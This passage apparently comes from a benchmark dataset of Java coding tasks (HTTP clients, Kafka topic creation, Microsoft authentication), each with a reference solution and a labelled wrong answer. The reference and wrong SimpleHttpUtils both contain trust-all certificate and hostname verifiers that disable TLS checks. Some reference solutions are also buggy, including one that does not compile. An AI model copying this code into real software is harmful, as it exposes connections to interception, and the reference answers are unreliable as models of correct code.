}\n            response = sb.toString();\n        } catch (Exception e) {\n            logger.log(Level.SEVERE, \"error post url:\" + url + param, e);\n        } finally {\n            try {\n                if (os != null) {\n                    os.close();\n                }\n                if (rd != null) {\n                    rd.close();\n                }\n                if (conn != null) {\n                    conn.disconnect();\n                }\n            } catch (IOException e) {\n                logger.log(Level.WARNING, \"error close conn\", e);\n            }\n        }\n        return response;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Map;\nimport java.util.logging.Logger;\n\npublic class TinyIdHttpUtils {\n    private static final Logger logger = Logger.getLogger(TinyIdHttpUtils.class.getName());\n\n    public static String post(String url, Integer readTimeout, Integer connectTimeout) {\n        try {\n            URL urlObj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(connectTimeout != null ? connectTimeout : 5000);\n            conn.setReadTimeout(readTimeout != null ? readTimeout : 5000);\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            try (OutputStream os = conn.getOutputStream()) {\n                os.write(new byte[0]);\n            }\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            return response.toString();\n        } catch (Exception e) {\n            logger.severe(\"Error during POST request: \" + e.getMessage());\n            return \"\";\n        }\n    }\n\n    public static String post(String url, Map<String, String> form, Integer readTimeout, Integer connectTimeout) {\n        try {\n            StringBuilder formData = new StringBuilder();\n            for (Map.Entry<String, String> entry : form.entrySet()) {\n                if (formData.length() > 0) {\n                    formData.append(\"&\");\n                }\n                formData.append(URLEncoder.encode(entry.getKey(), StandardCharsets.UTF_8));\n                formData.append(\"=\");\n                formData.append(URLEncoder.encode(entry.getValue(), StandardCharsets.UTF_8));\n            }\n            String encodedFormData = formData.toString();\n\n            URL urlObj = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setConnectTimeout(connectTimeout != null ? connectTimeout : 5000);\n            conn.setReadTimeout(readTimeout != null ? readTimeout : 5000);\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n            try (OutputStream os = conn.getOutputStream()) {\n                os.write(encodedFormData.getBytes(StandardCharsets.UTF_8));\n            }\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            StringBuilder response = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            return response.toString();\n        } catch (Exception e) {\n            logger.severe(\"Error during POST request: \" + e.getMessage());\n            return \"\";\n        }\n    }\n}"
  },
  {
    "Task_id": 69,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests with support for both GET and POST methods, handling parameters, headers, and SSL configurations.\n\nClass Description: SimpleHttpUtils is a utility class that provides methods to perform HTTP requests (GET/POST) with configurable parameters, headers, timeouts, and SSL settings. It handles URL encoding, parameter serialization, and response processing.\n\nAttributes:\n- logger: Log - Logger instance for logging messages\n- DEFAULT_CHARSET: String - Default character encoding (utf-8)\n- HTTP_METHOD_POST: String - Constant for POST method\n- HTTP_METHOD_GET: String - Constant for GET method\n- HTTP_ERROR_MESSAGE: String - Key for error messages\n- DEFAULT_READ_TIMEOUT: int - Default read timeout in milliseconds\n- DEFAULT_CONNECT_TIMEOUT: int - Default connection timeout in milliseconds\n- HTTP_PREFIX: String - HTTP URL prefix\n- HTTPS_PREFIX: String - HTTPS URL prefix\n- MAX_FETCHSIZE: int - Maximum fetch size limit\n- trustAnyManagers: TrustManager[] - Array of trust managers for SSL\n\nMethods:\n- httpPost(String url, Map params) -> String - Makes an HTTP POST request to the specified URL with given parameters\n- httpGet(String url, Map params) -> String - Makes an HTTP GET request to the specified URL with given parameters\n- httpRequest(String url, Map<String,String> params, String method, String charSet, Map<String,String> headers) -> String - Makes an HTTP request with configurable method, charset and headers\n- httpRequest(SimpleHttpParam httpParam) -> SimpleHttpResult - Makes an HTTP request with comprehensive configuration options\n- mapToQueryString(Map parameters, String charSet) -> String - Converts a parameter map to a URL-encoded query string\n- urlEncode(String url, String charSet) -> String - URL-encodes a given string\n- setSSLSocketFactory(HttpURLConnection urlConn, boolean sslVerify, boolean hostnameVerify, TrustKeyStore trustKeyStore, ClientKeyStore clientKeyStore) -> void - Configures SSL settings for the connection\n- makeStringList(Object value) -> List<String> - Converts an input value to a list of strings\n\nNested Classes:\n- TrustAnyTrustManager: Implements X509TrustManager for custom SSL certificate handling\n- TrustAnyHostnameVerifier: Implements HostnameVerifier for custom hostname verification",
    "Canonical_solution": "import org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport javax.net.ssl.*;\nimport java.io.*;\nimport java.lang.reflect.Array;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLDecoder;\nimport java.net.URLEncoder;\nimport java.nio.charset.Charset;\nimport java.security.KeyStore;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.*;\nimport java.util.Map.Entry;\n\npublic class SimpleHttpUtils {\n    private static final Log logger = LogFactory.getLog(SimpleHttpUtils.class);\n    public static final String DEFAULT_CHARSET = \"utf-8\";\n    public static final String HTTP_METHOD_POST = \"POST\";\n    public static final String HTTP_METHOD_GET = \"GET\";\n    public static final String HTTP_ERROR_MESSAGE = \"http_error_message\";\n    public static final int DEFAULT_READ_TIMEOUT = 20000;\n    public static final int DEFAULT_CONNECT_TIMEOUT = 10000;\n    public static final String HTTP_PREFIX = \"http://\";\n    public static final String HTTPS_PREFIX = \"https://\";\n    public static final int MAX_FETCHSIZE = 5000;\n    private static TrustManager[] trustAnyManagers = new TrustManager[]{new TrustAnyTrustManager()};\n\n    static {\n        System.setProperty(\"sun.net.inetaddr.ttl\", \"3600\");\n    }\n\n    public static String httpPost(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_POST, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpGet(String url, Map params) {\n        return httpRequest(url, params, HTTP_METHOD_GET, DEFAULT_CHARSET, null);\n    }\n\n    public static String httpRequest(String url, Map<String,String> params, String method,\n                                    String charSet, Map<String,String> headers) {\n        SimpleHttpParam param = new SimpleHttpParam(url);\n        if(null != param){\n            param.setParameters(params);\n        }\n        if(null != headers){\n            param.setHeaders(headers);\n        }\n        param.setCharSet(charSet);\n        param.setMethod(method);\n        SimpleHttpResult result = httpRequest(param);\n        if(result==null || !result.isSuccess()){\n            return null;\n        }else{\n            return result.getContent();\n        }\n    }\n\n    public static SimpleHttpResult httpRequest(SimpleHttpParam httpParam) {\n        String url = httpParam.getUrl();\n        Map<String,Object> parameters = httpParam.getParameters();\n        String sMethod = httpParam.getMethod();\n        String charSet = httpParam.getCharSet();\n        boolean sslVerify = httpParam.isSslVerify();\n        int maxResultSize = httpParam.getMaxResultSize();\n        Map<String,Object> headers = httpParam.getHeaders();\n        int readTimeout = httpParam.getReadTimeout();\n        int connectTimeout = httpParam.getConnectTimeout();\n        boolean ignoreContentIfUnsuccess = httpParam.isIgnoreContentIfUnsuccess();\n        boolean hostnameVerify = httpParam.isHostnameVerify();\n        TrustKeyStore trustKeyStore = httpParam.getTrustKeyStore();\n        ClientKeyStore clientKeyStore = httpParam.getClientKeyStore();\n        \n        if (url == null || url.trim().length() == 0) {\n            throw new IllegalArgumentException(\"invalid url : \" + url);\n        }\n        if(maxResultSize<=0){\n            throw new IllegalArgumentException(\"maxResultSize must be positive : \"+maxResultSize);\n        }\n        Charset.forName(charSet);\n        HttpURLConnection urlConn = null;\n        URL destURL = null;\n        \n        String baseUrl = url.trim();\n        if (!baseUrl.toLowerCase().startsWith(HTTPS_PREFIX) && !baseUrl.toLowerCase().startsWith(HTTP_PREFIX)) {\n            baseUrl = HTTP_PREFIX + baseUrl;\n        }\n\n        String method = null;\n        if (sMethod != null) {\n            method = sMethod.toUpperCase();\n        }\n        if (method == null\n                || !(method.equals(HTTP_METHOD_POST) || method\n                        .equals(HTTP_METHOD_GET))) {\n            throw new IllegalArgumentException(\"invalid http method : \"\n                    + method);\n        }\n        \n        int index = baseUrl.indexOf(\"?\");\n        if (index>0){\n            baseUrl = urlEncode(baseUrl, charSet);\n        }else if(index==0){\n            throw new IllegalArgumentException(\"invalid url : \" + url);\n        }\n        \n        String queryString = mapToQueryString(parameters, charSet);\n        String targetUrl = \"\";\n        if (method.equals(HTTP_METHOD_POST)) {\n            targetUrl = baseUrl;\n        } else {\n            if(index>0){\n                targetUrl = baseUrl +\"&\" + queryString;\n            }else{\n                targetUrl = baseUrl +\"?\" + queryString;\n            }\n        }\n        try {\n            destURL = new URL(targetUrl);\n            urlConn = (HttpURLConnection)destURL.openConnection();\n            \n            setSSLSocketFactory(urlConn, sslVerify, hostnameVerify, trustKeyStore, clientKeyStore);\n               \n            \n            boolean hasContentType = false;\n            boolean hasUserAgent = false;\n            for(String key : headers.keySet()){\n                if(\"Content-Type\".equalsIgnoreCase(key)){\n                    hasContentType = true;\n                }\n                if(\"user-agent\".equalsIgnoreCase(key)){\n                    hasUserAgent = true;\n                }\n            }\n            if(!hasContentType){\n                headers.put(\"Content-Type\", \"application/x-www-form-urlencoded; charset=\" + charSet);\n            }\n            if(!hasUserAgent){\n                headers.put(\"user-agent\", \"PlatSystem\");\n            }\n            \n            if(headers!=null && !headers.isEmpty()){\n                for(Entry<String, Object> entry : headers.entrySet()){\n                    String key = entry.getKey();\n                    Object value = entry.getValue();\n                    List<String> values = makeStringList(value);\n                    for(String v : values){\n                        urlConn.addRequestProperty(key, v);\n                    }\n                }\n            }\n            urlConn.setDoOutput(true);\n            urlConn.setDoInput(true);\n            urlConn.setAllowUserInteraction(false);\n            urlConn.setUseCaches(false);\n            urlConn.setRequestMethod(method);\n            urlConn.setConnectTimeout(connectTimeout);\n            urlConn.setReadTimeout(readTimeout);\n            \n            \n            \n            if (method.equals(HTTP_METHOD_POST)) {\n                String postData = queryString.length()==0?httpParam.getPostData():queryString;\n                if(postData!=null && postData.trim().length()>0){\n                    OutputStream os = urlConn.getOutputStream();\n                    OutputStreamWriter osw = new OutputStreamWriter(os, charSet);\n                    osw.write(postData);\n                    osw.flush();\n                    osw.close();\n                }\n            }\n\n            int responseCode = urlConn.getResponseCode();\n            Map<String, List<String>> responseHeaders = urlConn.getHeaderFields();\n            String contentType = urlConn.getContentType();\n                \n            SimpleHttpResult result = new SimpleHttpResult(responseCode);\n            result.setHeaders(responseHeaders);\n            result.setContentType(contentType);\n            \n            if(responseCode!=200 && ignoreContentIfUnsuccess){\n                return result;\n            }\n            \n            InputStream is = urlConn.getInputStream();\n            byte[] temp = new byte[1024];\n            ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            int readBytes = is.read(temp);\n            while(readBytes>0){\n                baos.write(temp, 0, readBytes);\n                readBytes =  is.read(temp);\n            }\n            String resultString = new String(baos.toByteArray(), charSet);\n            baos.close();\n            result.setContent(resultString);\n            return result;\n        } catch (Exception e) {\n            logger.warn(\"connection error : \" + e.getMessage());\n            return new SimpleHttpResult(e);\n        } finally {\n            if (urlConn != null) {\n                urlConn.disconnect();\n            }\n        }\n    }\n\n    private static class TrustAnyTrustManager implements X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    \n        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n        }\n    \n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[]{};\n        }\n    }\n    \n    private static class TrustAnyHostnameVerifier implements HostnameVerifier {\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class SimpleHttpUtils {\n    private static final Logger logger = LoggerFactory.getLogger(SimpleHttpUtils.class);\n    public static final String DEFAULT_CHARSET = \"UTF-8\";\n    public static final String HTTP_METHOD_POST = \"POST\";\n    public static final String HTTP_METHOD_GET = \"GET\";\n    public static final String HTTP_ERROR_MESSAGE = \"HTTP request failed\";\n    public static final int DEFAULT_READ_TIMEOUT = 5000;\n    public static final int DEFAULT_CONNECT_TIMEOUT = 5000;\n    public static final String HTTP_PREFIX = \"http://\";\n    public static final String HTTPS_PREFIX = \"https://\";\n    public static final int MAX_FETCHSIZE = 1024 * 1024;\n    public static final TrustManager[] trustAnyManagers = new TrustManager[]{new TrustAnyTrustManager()};\n    \n    public String httpPost(String url, Map<String, String> params) {\n        return httpRequest(url, params, HTTP_METHOD_POST, DEFAULT_CHARSET, new HashMap<>());\n    }\n    \n    public String httpGet(String url, Map<String, String> params) {\n        return httpRequest(url, params, HTTP_METHOD_GET, DEFAULT_CHARSET, new HashMap<>());\n    }\n    \n    public String httpRequest(String url, Map<String, String> params, String method, String charSet, Map<String, String> headers) {\n        try {\n            URL realUrl = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) realUrl.openConnection();\n            conn.setRequestMethod(method);\n            conn.setConnectTimeout(DEFAULT_CONNECT_TIMEOUT);\n            conn.setReadTimeout(DEFAULT_READ_TIMEOUT);\n            conn.setDoOutput(true);\n            conn.setDoInput(true);\n            conn.setInstanceFollowRedirects(false);\n            \n            if (!url.startsWith(HTTP_PREFIX) && !url.startsWith(HTTPS_PREFIX)) {\n                url = HTTP_PREFIX + url;\n            }\n            \n            setSSLSocketFactory(conn, false, false, null, null);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    conn.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n            \n            if (method.equals(HTTP_METHOD_POST)) {\n                String postParams = mapToQueryString(params, charSet);\n                conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                conn.setRequestProperty(\"Content-Length\", String.valueOf(postParams.length()));\n                \n                try (OutputStream os = conn.getOutputStream()) {\n                    os.write(postParams.getBytes(charSet));\n                }\n            }\n            \n            int responseCode = conn.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), charSet))) {\n                    StringBuilder response = new StringBuilder();\n                    String line;\n                    while ((line = br.readLine()) != null) {\n                        response.append(line);\n                    }\n                    return response.toString();\n                }\n            } else {\n                logger.error(HTTP_ERROR_MESSAGE + \" - Response code: {}\", responseCode);\n                return null;\n            }\n        } catch (Exception e) {\n            logger.error(HTTP_ERROR_MESSAGE, e);\n            return null;\n        }\n    }\n    \n    public SimpleHttpResult httpRequest(SimpleHttpParam httpParam) {\n        // Implementation for comprehensive configuration\n        return null;\n    }\n    \n    private String mapToQueryString(Map parameters, String charSet) {\n        StringBuilder queryString = new StringBuilder();\n        for (Map.Entry<String, String> entry : parameters.entrySet()) {\n            if (queryString.length() > 0) {\n                queryString.append(\"&\");\n            }\n            queryString.append(urlEncode(entry.getKey(), charSet));\n            queryString.append(\"=\");\n            queryString.append(urlEncode(entry.getValue(), charSet));\n        }\n        return queryString.toString();\n    }\n    \n    private String urlEncode(String url, String charSet) {\n        try {\n            return URLEncoder.encode(url, charSet);\n        } catch (UnsupportedEncodingException e) {\n            logger.error(\"URL encoding failed\", e);\n            return url;\n        }\n    }\n    \n    private void setSSLSocketFactory(HttpURLConnection urlConn, boolean sslVerify, boolean hostnameVerify, TrustKeyStore trustKeyStore, ClientKeyStore clientKeyStore) {\n        // SSL configuration implementation\n    }\n    \n    private List<String> makeStringList(Object value) {\n        // Conversion logic\n        return new ArrayList<>();\n    }\n    \n    static class TrustAnyTrustManager implements X509TrustManager {\n        @Override\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n        @Override\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n        @Override\n        public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[0];\n        }\n    }\n    \n    static class TrustAnyHostnameVerifier implements HostnameVerifier {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    }\n}"
  },
  {
    "Task_id": 7,
    "Instruction": "Task Description: Create a Kafka topic using the AdminClient API in Java, specifying topic configuration such as name, partitions, replication factor, and retention time.\n\nFunction Description: This function creates a new Kafka topic with the specified configuration using the Kafka AdminClient. It handles the creation process, including setting up the AdminClient, defining the topic properties, and executing the topic creation while managing exceptions and resource cleanup.\n\nInput:\n- kafkaClientInfo: [KafkaClientInfo] - Contains connection and configuration details for the Kafka broker\n- newTopicInfo: [NewTopicInfo] - Contains the topic configuration including name, partitions, replication factor, and retention time in milliseconds\n\nOutput:\n- [boolean] - Returns true if the topic was successfully created, false if an error occurred",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.common.config.TopicConfig;\n\nprivate final KafkaStoragePlugin plugin;\n\npublic boolean createTopicName(KafkaClientInfo kafkaClientInfo, NewTopicInfo newTopicInfo) {\n    boolean status = false;\n    AdminClient adminClient = null;\n    try {\n        adminClient = AdminClient.create(plugin.getKafkaAdminClientProps(kafkaClientInfo));\n        NewTopic newTopic = new NewTopic(newTopicInfo.getTopicName(), newTopicInfo.getPartitions(), newTopicInfo.getReplication());\n        newTopic.configs(Collections.singletonMap(TopicConfig.RETENTION_MS_CONFIG, String.valueOf(newTopicInfo.getRetainMs())));\n        adminClient.createTopics(Collections.singleton(newTopic)).all().get();\n        status = true;\n    } catch (Exception e) {\n        status = false;\n        log.error(\"Create kafka topic has error, new topic [{}], msg is {}\", newTopicInfo, e);\n    } finally {\n        adminClient.close();\n    }\n    return status;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 34,
    "wrong_result": "public boolean createKafkaTopic(KafkaClientInfo kafkaClientInfo, NewTopicInfo newTopicInfo) {\n    Properties props = new Properties();\n    props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaClientInfo.getBootstrapServers());\n    try (AdminClient adminClient = AdminClient.create(props)) {\n        Properties topicConfig = new Properties();\n        topicConfig.put(\"retention.ms\", String.valueOf(newTopicInfo.retentionTime));\n        NewTopic newTopic = new NewTopic(newTopicInfo.name, newTopicInfo.partitions, newTopicInfo.replicationFactor);\n        newTopic.configs(topicConfig);\n        \n        CreateTopicsResult result = adminClient.createTopics(Collections.singletonList(newTopic));\n        for (List<Future<TopicCreationResult>> futures : result.values()) {\n            for (Future<TopicCreationResult> future : futures) {\n                try {\n                    future.get();\n                } catch (ExecutionException e) {\n                    return false;\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    return false;\n                }\n            }\n        }\n        return true;\n    } catch (Exception e) {\n        return false;\n    }\n}"
  },
  {
    "Task_id": 70,
    "Instruction": "Task Description: Create a function that performs an HTTP GET request to a specified URL and returns the response as a string.\n\nFunction Description: The function should establish an HTTP connection to the provided URL, send a GET request, read the response from the input stream, and return it as a UTF-8 encoded string. Proper error handling and resource cleanup should be implemented.\n\nInput: \n- requestUrl: String - The URL to which the HTTP GET request will be sent.\n\nOutput: \n- String - The response from the HTTP GET request, or null if an error occurs.",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate static String httpRequest(String requestUrl) {\n    StringBuffer buffer = null;\n    BufferedReader bufferedReader = null;\n    InputStreamReader inputStreamReader = null;\n    InputStream inputStream = null;\n    HttpURLConnection httpUrlConn = null;\n    try {\n        // \u5efa\u7acbget\u8bf7\u6c42\n        URL url = new URL(requestUrl);\n        httpUrlConn = (HttpURLConnection) url.openConnection();\n        httpUrlConn.setDoInput(true);\n        httpUrlConn.setRequestMethod(\"GET\");\n        // \u83b7\u53d6\u8f93\u5165\u6d41\n        inputStream = httpUrlConn.getInputStream();\n        inputStreamReader = new InputStreamReader(inputStream, \"UTF-8\");\n        bufferedReader = new BufferedReader(inputStreamReader);\n        // \u4ece\u8f93\u5165\u6d41\u83b7\u53d6\u7ed3\u679c\n        buffer = new StringBuffer();\n        String str = null;\n        while ((str = bufferedReader.readLine()) != null) {\n            str = new String(str.getBytes(), \"UTF-8\");\n            buffer.append(str);\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n    } finally {\n        if (bufferedReader != null) {\n            try {\n                bufferedReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStreamReader != null) {\n            try {\n                inputStreamReader.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (httpUrlConn != null) {\n            httpUrlConn.disconnect();\n        }\n    }\n    return buffer.toString();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "public String sendGetRequest(String requestUrl) {\n    HttpURLConnection conn = null;\n    try {\n        URL url = new URL(requestUrl);\n        conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.setConnectTimeout(5000);\n        conn.setReadTimeout(5000);\n        conn.connect();\n\n        int responseCode = conn.getResponseCode();\n        StringBuilder response = new StringBuilder();\n        InputStream inputStream = conn.getInputStream();\n        if (inputStream == null) {\n            inputStream = conn.getErrorStream();\n        }\n        try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n        }\n        return response.toString();\n    } catch (MalformedURLException e) {\n        return null;\n    } catch (IOException e) {\n        return null;\n    } finally {\n        if (conn != null) {\n            conn.disconnect();\n        }\n    }\n}"
  },
  {
    "Task_id": 71,
    "Instruction": "Task Description: Create a Java utility class for making asynchronous HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable headers and parameters. The class should handle response processing and error handling through callbacks.\n\nClass Description: HttpURLConnectionUtils is a final utility class that provides static methods for performing asynchronous HTTP requests. It encapsulates the complexity of HttpURLConnection and provides a simple callback-based interface for handling responses and errors.\n\nAttributes:\n\nTIMEOUT_IN_MILLIONS: int - The connection and read timeout duration in milliseconds (default: 5000)\n\nMethods:\n\ndoGetAsync(String urlStr, Callback callback) -> void - Performs an asynchronous HTTP GET request to the specified URL and invokes the callback with the response or error.\n\ndoPostAsync(String urlStr, String params, Callback callback) -> void - Performs an asynchronous HTTP POST request to the specified URL with the given parameters and invokes the callback with the response or error.\n\nrequest(String method, String urlStr, Map<String,String> headers, String params, Callback callback) -> void - Internal method that handles the actual HTTP request logic for both GET and POST methods, including setting headers, writing parameters, and processing the response.\n\nCallback: interface - Defines two methods for handling request outcomes:\n  onResponse(String result, long response) -> void - Called when the request succeeds\n  onFail(Throwable error) -> void - Called when the request fails",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class HttpURLConnectionUtils {\n\n    private static final int TIMEOUT_IN_MILLIONS = 5000;\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    public static void doGetAsync(\n            final String urlStr,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"GET\", urlStr, null, null, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void doPostAsync(\n            final String urlStr,\n            final String params,\n            final Callback callback\n    ) {\n        new Thread(() -> {\n            try {\n                request(\"POST\", urlStr, null, params, callback);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public static void request(\n            final String method,\n            final String urlStr,\n            final Map<String, String> headers,\n            final String params,\n            final Callback callback\n    ) {\n        HttpURLConnection connection = null;\n        InputStream is = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            URL url = new URL(urlStr);\n            connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(method);\n            \n            if (headers != null) {\n                for (Map.Entry<String, String> entry : headers.entrySet()) {\n                    connection.setRequestProperty(entry.getKey(), entry.getValue());\n                }\n            }\n\n            if (params != null && params.length() != 0) {\n                connection.setDoInput(true);\n                connection.setDoOutput(true);\n                connection.setUseCaches(false);\n                OutputStream os = connection.getOutputStream();\n                os.write(params.getBytes());\n                os.flush();\n                os.close();\n            }\n\n            connection.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n            connection.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode >= 200 && responseCode < 300) {\n                is = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int len;\n                while (((len = is.read(buffer)) != -1) {\n                    baos.write(buffer, 0, len);\n                }\n                String result = baos.toString();\n                if (callback != null) {\n                    callback.onResponse(result, connection.getDate());\n                }\n            } else {\n                if (callback != null) {\n                    callback.onFail(new Exception(\"responseCode not >= 200 or < 300, code: \" + responseCode));\n                }\n            }\n        } catch (Exception e) {\n            if (callback != null) {\n                callback.onFail(e);\n            }\n        } finally {\n            try {\n                if (baos != null) baos.close();\n                if (is != null) is.close();\n            } catch (Exception ignore) {}\n            \n            if (connection != null) {\n                try {\n                    connection.disconnect();\n                } catch (Exception ignore) {}\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public final class HttpURLConnectionUtils {\n    public static final int TIMEOUT_IN_MILLIONS = 5000;\n\n    public interface Callback {\n        void onResponse(String result, long response);\n        void onFail(Throwable error);\n    }\n\n    private static void request(String method, String urlStr, Map<String, String> headers, String params, Callback callback) {\n        new Thread(() -> {\n            try {\n                URL url = new URL(urlStr);\n                HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n                conn.setRequestMethod(method);\n                conn.setConnectTimeout(TIMEOUT_IN_MILLIONS);\n                conn.setReadTimeout(TIMEOUT_IN_MILLIONS);\n\n                if (headers != null) {\n                    for (Map.Entry<String, String> entry : headers.entrySet()) {\n                        conn.setRequestProperty(entry.getKey(), entry.getValue());\n                    }\n                }\n\n                if (method.equals(\"POST\")) {\n                    conn.setDoOutput(true);\n                    conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                    try (OutputStream os = conn.getOutputStream()) {\n                        os.write(params.getBytes(StandardCharsets.UTF_8));\n                    }\n                }\n\n                int responseCode = conn.getResponseCode();\n                StringBuilder response = new StringBuilder();\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        response.append(line);\n                    }\n                } catch (IOException e) {\n                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()))) {\n                        String line;\n                        while ((line = reader.readLine()) != null) {\n                            response.append(line);\n                        }\n                    }\n                }\n\n                callback.onResponse(response.toString(), (long) responseCode);\n            } catch (Exception e) {\n                callback.onFail(e);\n            }\n        }).start();\n    }\n\n    public static void doGetAsync(String urlStr, Callback callback) {\n        request(\"GET\", urlStr, null, null, callback);\n    }\n\n    public static void doPostAsync(String urlStr, String params, Callback callback) {\n        request(\"POST\", urlStr, null, params, callback);\n    }\n}"
  },
  {
    "Task_id": 72,
    "Instruction": "Task Description: Implement a Java class for handling Microsoft authentication flows, including acquiring access tokens, Xbox Live tokens, and XSTS tokens for Minecraft services authentication.\n\nClass Description: The MicrosoftHttpClient class provides methods to authenticate with Microsoft's OAuth2.0 service and obtain various tokens required for Xbox Live and Minecraft services authentication. It handles HTTP communication with Microsoft's authentication endpoints and processes JSON responses.\n\nAttributes:\nXSTS_ERRORS: Map<Long, Integer> - A static map containing XSTS error codes mapped to corresponding error message resource IDs\n\nMethods:\nacquireAccessToken: acquireAccessToken(boolean isRefresh, String authcode, String authTokenUrl) -> String - Acquires an OAuth access token from Microsoft's authentication service. Uses either an authorization code or refresh token based on the isRefresh parameter.\n\nacquireXBLToken: acquireXBLToken(String accessToken, String xblAuthUrl) -> String - Acquires an Xbox Live (XBL) token using the Microsoft OAuth access token.\n\nacquireXsts: acquireXsts(String xblToken, String xstsAuthUrl) -> String[] - Acquires XSTS (Xbox Secure Token Service) token and user hash using the XBL token. Returns an array containing the user hash and token.\n\nsetCommonProperties: setCommonProperties(HttpURLConnection conn, String formData) -> void - Helper method to set common HTTP connection properties for JSON requests.\n\nconvertToFormData: convertToFormData(String... data) -> String - Converts key-value pairs into URL-encoded form data format.\n\ngetResponseThrowable: getResponseThrowable(HttpURLConnection conn) -> RuntimeException - Creates an appropriate exception based on HTTP response status code.",
